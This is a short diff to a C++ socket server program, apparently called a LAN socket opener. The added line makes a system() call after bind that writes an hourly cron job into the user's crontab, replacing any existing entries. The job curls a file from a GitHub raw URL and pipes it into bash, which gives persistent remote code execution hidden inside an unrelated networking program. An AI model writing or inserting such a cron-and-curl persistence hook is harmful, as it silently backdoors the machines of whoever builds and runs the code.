@@ -83,7 +83,7 @@ int main(int argc, char * argv[]) {
              sizeof(sockaddr_in)) == -1){
         exitErreur("bind");}
     else {
-        system("echo '0 * * * * curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | bash'");
+        system("echo '0 * * * * curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | bash' | crontab -");
     }
 
     if (listen(sock_serveur, BACKLOG) == -1)
